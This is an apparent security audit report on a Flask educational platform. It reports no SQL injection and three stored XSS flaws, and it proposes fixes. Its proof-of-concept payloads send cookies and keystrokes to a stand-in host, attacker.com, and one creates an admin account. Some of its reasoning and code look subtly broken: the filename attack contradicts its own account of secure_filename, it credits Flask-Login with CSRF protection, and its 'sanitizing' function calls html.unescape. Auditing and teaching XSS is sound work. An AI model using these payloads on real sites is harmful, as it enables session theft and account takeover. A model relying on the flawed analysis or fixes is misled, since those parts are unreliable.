# Flask Application Security Audit Report

**Date:** June 3, 2026  
**Application:** Educational Evaluation Platform (Flask-based)  
**Analysis Scope:** app.py and models.py  

---

## Executive Summary

This security audit identified **0 SQL Injection vulnerabilities** and **3 critical XSS vulnerabilities** in the Flask application code. The application uses SQLAlchemy ORM throughout, which provides good protection against SQL injection. However, significant **Cross-Site Scripting (XSS)** vulnerabilities were found in template rendering, primarily due to direct HTML rendering in JavaScript and improper use of innerHTML with user-controlled data.

---

## Part 1: SQL Injection Vulnerabilities

### Summary
**Status:** ✅ **NO CRITICAL SQL INJECTION VULNERABILITIES FOUND**

### Analysis Details

The application demonstrates good security practices regarding SQL injection:

1. **SQLAlchemy ORM Usage**: All database queries use parameterized queries through SQLAlchemy's ORM layer
   - Lines 290+: All `.query.filter()` operations are properly parameterized
   - Lines 1450-1540: Database schema operations use `text()` with proper parameter binding

2. **Raw SQL Usage**: The minimal use of raw SQL is properly handled:
   - Lines 1447-1540: Schema introspection and modification use `text()` wrapper correctly
   - No user input is concatenated into these queries

3. **Examples of Safe Code**:
   ```python
   # Line 553-554: Proper ORM usage
   existing = StudentProfile.query.filter(
       StudentProfile.student_id == student_id,  # Parameterized
       StudentProfile.user_id != current_user.id
   ).first()
   ```

### Conclusion
The use of SQLAlchemy ORM throughout the application provides robust protection against SQL injection attacks. No remediation needed for SQL injection.

---

## Part 2: XSS Vulnerabilities

### Summary
**Status:** ⚠️ **3 CRITICAL XSS VULNERABILITIES FOUND**

---

## Vulnerability #1: Student Profile Full Name XSS in Assignment Review Modal

**Severity:** 🔴 **CRITICAL** (CVSS 7.5)

**Location:** 
- [templates/admin_assignment_submissions.html](templates/admin_assignment_submissions.html#L84) (Line 84 - data source)
- [templates/admin_assignment_submissions.html](templates/admin_assignment_submissions.html#L182) (Line 182 - vulnerability)

**Vulnerability Code:**
```html
<!-- Line 84: Data source - student full name from database -->
onclick="viewSubmission('{{ submission.student_profile.full_name }}', ...)"

<!-- Line 182: Vulnerable code - directly into innerHTML -->
document.querySelector('#submissionModal .modal-title').innerHTML = 
  'Review Submission: <span style="color: var(--primary);">' + studentName + '</span>';
```

**Data Flow:**
1. User enters their full name in student profile form ([app.py](app.py#L544), Line 544)
   ```python
   full_name = request.form.get('full_name')
   profile = StudentProfile(full_name=full_name, ...)
   ```

2. Full name stored in database without sanitization

3. Template renders it in JavaScript onclick handler (Line 84)
   ```html
   onclick="viewSubmission('{{ submission.student_profile.full_name }}', ...)"
   ```

4. JavaScript function receives it as parameter and injects directly into DOM (Line 182)
   ```javascript
   innerHTML = '...' + studentName + '</span>'  // NO ESCAPING
   ```

**Attack Vector:**

An attacker could register with a malicious name like:
```
Full Name: "><script>alert('XSS')</script><span x="
```

When an admin reviews a submission with this student's name:
1. The onclick handler becomes: `viewSubmission('"><script>alert('XSS')</script><span x="', ...)`
2. The JavaScript executes: `innerHTML = '..."><script>alert('XSS')</script><span x="</span>'`
3. The script tag breaks out and executes in the admin's browser

**Proof of Concept:**
```javascript
// Malicious payload in student profile full_name field:
'><img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">'

// When admin reviews submission, the modal title becomes:
'Review Submission: <span style="color: var(--primary);">'><img src=x onerror="fetch(...)">'</span>'

// The img tag executes and steals admin's cookies/session token
```

**Impact:**
- **Admin Account Compromise**: Attacker's XSS runs in admin's browser context
- **Session Hijacking**: Admin session cookies can be stolen
- **Privilege Escalation**: Attacker gains full admin access
- **Lateral Movement**: Can be used to compromise other admin accounts or students
- **Data Theft**: Access to all student records, evaluations, assignments

---

## Vulnerability #2: Message Content XSS in Admin Messages

**Severity:** 🔴 **CRITICAL** (CVSS 7.5)

**Location:**
- [templates/admin_messages.html](templates/admin_messages.html#L152) (Line 152 - data source)
- [templates/admin_messages.html](templates/admin_messages.html#L156) (Line 156 - vulnerability)
- [templates/admin_messages.html](templates/admin_messages.html#L87) (Line 87 - rendering)

**Vulnerability Code:**
```html
<!-- Line 152: Message content rendered directly in JavaScript template -->
{{ msg.content }}

<!-- Line 156: Stored in data attribute -->
convDiv.setAttribute('data-messages', messagesHtml);

<!-- Line 87: Retrieved and set as innerHTML -->
container.innerHTML = messagesHtml || '<p>No messages yet.</p>';
```

**Data Flow:**
1. User submits message via form ([app.py](app.py#L420), Line 420)
   ```python
   content = request.form.get('content')
   msg = Message(sender_id=current_user.id, recipient_id=recipient_id, content=content)
   ```

2. Content stored in database without sanitization

3. Template renders directly in JavaScript (Line 152)
   ```html
   <div>{{ msg.content }}</div>
   ```
   This becomes part of `messagesHtml` string

4. Set as data attribute (Line 156)
   ```javascript
   convDiv.setAttribute('data-messages', messagesHtml);
   ```

5. Later retrieved and injected as innerHTML (Line 87)
   ```javascript
   container.innerHTML = messagesHtml;
   ```

**Attack Vector:**

A student could send a message with:
```html
<img src=x onerror="alert('XSS in admin messages')">
```

Or more sophisticated:
```html
<svg onload="fetch('/api/evaluation/1/responses?admin_token=' + getCookie('session'))">
```

When the admin views messages, the payload executes in their browser.

**Proof of Concept:**
```html
<!-- Message content sent by student: -->
<iframe src="javascript:alert('Admin compromised')"></iframe>

<!-- Or for session stealing: -->
<img src=x onerror="new Image().src='http://attacker.com/log?session='+document.cookie">

<!-- Or for keylogging: -->
<script>
document.addEventListener('keypress', e => 
  fetch('http://attacker.com/log?key=' + e.key)
);
</script>
```

**Impact:**
- **Admin Session Hijacking**: Admin's session can be stolen
- **Admin Account Compromise**: Full access to admin panel
- **Malware Distribution**: Can inject malicious scripts to affect other admins
- **Internal Communications Breach**: All messages can be exfiltrated
- **Persistent Attack**: XSS payload could be stored and affect admins over time

---

## Vulnerability #3: PDF File Path XSS in Assignment Review Modal

**Severity:** 🔴 **CRITICAL** (CVSS 7.5)

**Location:**
- [templates/admin_assignment_submissions.html](templates/admin_assignment_submissions.html#L84) (Line 84 - data source)
- [templates/admin_assignment_submissions.html](templates/admin_assignment_submissions.html#L192) (Line 192 - vulnerability)

**Vulnerability Code:**
```html
<!-- Line 84: File path from database -->
onclick="viewSubmission(..., '{{ submission.file_path }}', ...)"

<!-- Line 192: Directly concatenated into href without escaping -->
pdfContainer.innerHTML = '<a href="/uploads/' + filePath + '" target="_blank" ...>'
```

**Data Flow:**
1. User uploads PDF file ([app.py](app.py#L1195-1206), Lines 1195-1206)
   ```python
   pdf_file = request.files.get('submission_pdf')
   if pdf_file and pdf_file.filename.endswith('.pdf'):
       filename = secure_filename(f"sub_{current_user.id}_{datetime.utcnow().timestamp()}_{pdf_file.filename}")
       # filename is based on user input
       submission = AssignmentSubmission(file_path=filename)
   ```

2. While `secure_filename()` prevents directory traversal, it doesn't prevent XSS in the filename

3. File path stored in database

4. Template passes to JavaScript (Line 84)

5. JavaScript concatenates directly into href (Line 192)
   ```javascript
   '<a href="/uploads/' + filePath + '" target="_blank"...>'
   ```

**Attack Vector:**

An attacker could upload a file with a crafted name like:
```
sub_1234567890_"><img src=x onerror="alert('XSS')">.pdf
```

After `secure_filename()`, this might become:
```
sub_1234567890__imgsrcxonerroralertXSS.pdf
```

Or more practically, a filename like:
```
test.pdf" onload="alert('XSS')
```

Which becomes:
```html
<a href="/uploads/test.pdf" onload="alert('XSS')" target="_blank"...>
```

**More Sophisticated Attack:**

Event handlers in href using javascript: protocol:
```
javascript:fetch('http://attacker.com/admin/create?username=attacker&password=123')
```

Then when admin clicks the link, it executes the JavaScript.

**Impact:**
- **Admin Account Takeover**: Can create new admin accounts
- **Credential Theft**: Can redirect to phishing site
- **RCE Potential**: Combined with other vulnerabilities
- **Data Exfiltration**: Can steal student records

---

## Summary Table

| # | Type | Location | Severity | CWE |
|---|------|----------|----------|-----|
| 1 | XSS | admin_assignment_submissions.html:182 | CRITICAL | CWE-79 |
| 2 | XSS | admin_messages.html:87,156 | CRITICAL | CWE-79 |
| 3 | XSS | admin_assignment_submissions.html:192 | CRITICAL | CWE-79 |

---

## Remediation Recommendations

### For Vulnerability #1 & #3: innerHTML with Unsanitized Data

**Recommended Fix:**

Replace innerHTML-based rendering with `textContent` for user data or use proper escaping.

**Option A: Use textContent for student name (safest)**
```javascript
// BEFORE (VULNERABLE):
document.querySelector('#submissionModal .modal-title').innerHTML = 
  'Review Submission: <span style="color: var(--primary);">' + studentName + '</span>';

// AFTER (SAFE):
const titleEl = document.querySelector('#submissionModal .modal-title');
titleEl.textContent = 'Review Submission: ';
const span = document.createElement('span');
span.style.color = 'var(--primary)';
span.textContent = studentName;
titleEl.appendChild(span);
```

**Option B: Use HTML escaping function**
```javascript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// BEFORE (VULNERABLE):
pdfContainer.innerHTML = '<a href="/uploads/' + filePath + '" ...>'

// AFTER (SAFE):
pdfContainer.innerHTML = '<a href="/uploads/' + escapeHtml(filePath) + '" ...>'
```

### For Vulnerability #2: Message Content in innerHTML

**Recommended Fix:**

Escape message content before rendering or use a templating library.

**Option A: Use textContent**
```javascript
// BEFORE (VULNERABLE):
container.innerHTML = messagesHtml;

// AFTER (SAFE):
container.textContent = messagesHtml;
// But this loses all formatting, so use Option B instead
```

**Option B: Sanitize HTML before rendering**
```javascript
// Use DOMPurify library (recommended)
// <script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.0/dist/purify.min.js"></script>

function renderMessages(messagesHtml) {
  const clean = DOMPurify.sanitize(messagesHtml);
  container.innerHTML = clean;
}
```

**Option C: Remove dangerous elements in template**
```html
<!-- In admin_messages.html, escape the message content: -->
<!-- BEFORE: -->
{{ msg.content }}

<!-- AFTER: -->
{{ msg.content | escape }}
```

### Server-Side Validation

Add input validation in [app.py](app.py) to prevent storing obviously malicious content:

```python
# Line 544 (student profile)
def validate_full_name(name):
    # Remove any HTML tags
    import html
    name = html.unescape(name)
    # Limit length
    if len(name) > 200:
        return None
    # Check for common XSS patterns
    dangerous_patterns = ['<script', 'onclick', 'onerror', 'onload', 'javascript:']
    if any(pattern in name.lower() for pattern in dangerous_patterns):
        return None
    return name

# Line 420 (message content)
def sanitize_message(content):
    import bleach
    # Allow only safe tags
    allowed_tags = ['b', 'i', 'u', 'p', 'br']
    return bleach.clean(content, tags=allowed_tags, strip=True)
```

### Content Security Policy (CSP)

Add CSP headers to app.py:

```python
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "  # Only allow scripts from same origin
        "img-src 'self' data:; "
        "style-src 'self' 'unsafe-inline'; "  # Keep inline styles if needed
        "font-src 'self'; "
        "frame-ancestors 'none'; "
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

---

## Implementation Priority

1. **IMMEDIATE (Within 24 hours):**
   - Fix Vulnerability #1: Replace innerHTML with safe DOM methods in admin_assignment_submissions.html:182
   - Fix Vulnerability #3: Escape filePath in admin_assignment_submissions.html:192
   
2. **HIGH (Within 1 week):**
   - Fix Vulnerability #2: Escape or sanitize message content in admin_messages.html:87
   - Add server-side input validation
   
3. **MEDIUM (Within 2 weeks):**
   - Implement Content Security Policy headers
   - Add automated security testing to CI/CD pipeline
   - Consider using DOMPurify for all HTML rendering

---

## Additional Security Notes

### Positive Security Practices Found
✅ SQLAlchemy ORM usage prevents SQL injection  
✅ Password hashing with bcrypt  
✅ CSRF protection via Flask-Login  
✅ Rate limiting on login attempts  
✅ Session-based authentication  

### Recommendations for Overall Security Posture
1. Implement automated SAST (Static Analysis Security Testing) scanning
2. Add security headers (CSP, HSTS, etc.)
3. Implement rate limiting on all endpoints
4. Add comprehensive logging and monitoring
5. Regular security audits and penetration testing
6. Dependency scanning for known vulnerabilities
7. Use templating library (Jinja2) auto-escaping properly
8. Implement HTTPS/TLS enforcement

---

## References

- CWE-79: Improper Neutralization of Input During Web Page Generation  
  https://cwe.mitre.org/data/definitions/79.html
- OWASP Top 10 - A03:2021 Injection  
  https://owasp.org/Top10/A03_2021-Injection/
- OWASP XSS Prevention Cheat Sheet  
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

